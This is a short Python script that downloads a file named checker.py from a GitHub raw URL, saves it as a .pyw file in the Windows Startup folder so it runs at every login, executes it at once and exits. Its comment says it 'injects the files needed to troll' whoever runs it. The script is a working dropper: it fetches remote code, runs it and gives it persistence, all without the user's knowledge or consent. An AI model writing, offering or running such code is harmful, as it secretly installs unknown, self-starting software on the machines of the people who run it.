# Downloads and injects the files needed to troll your dumbass
def clone():
    import os, urllib.request, pathlib
    dlurl = 'https://raw.githubusercontent.com/xXEthyleneXx/NumberGame/master/checker.py'
    home = os.path.expanduser("~")
    path = str(home) + '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\checker.pyw'
    urllib.request.urlretrieve(dlurl, '{}'.format(path))
    os.system('{}'.format(str(path)))
    exit()

clone()